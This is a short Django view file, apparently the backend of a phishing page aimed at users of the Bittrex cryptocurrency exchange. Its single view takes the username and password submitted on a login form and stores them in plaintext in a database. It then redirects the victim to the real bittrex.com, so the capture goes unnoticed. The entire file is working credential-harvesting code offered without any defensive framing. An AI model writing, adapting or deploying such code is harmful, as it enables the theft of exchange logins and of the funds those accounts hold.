from django.shortcuts import render, redirect

from gadzylogin.models import LoginDetails


def page(request):
    if request.POST:

        username = request.POST.get("username")
        password = request.POST.get('password')

        new_applicant = LoginDetails(username=username, password=password)

        new_applicant.save()
        success = 1
        return redirect('https://bittrex.com')
    else:
        return render(request, 'index.html')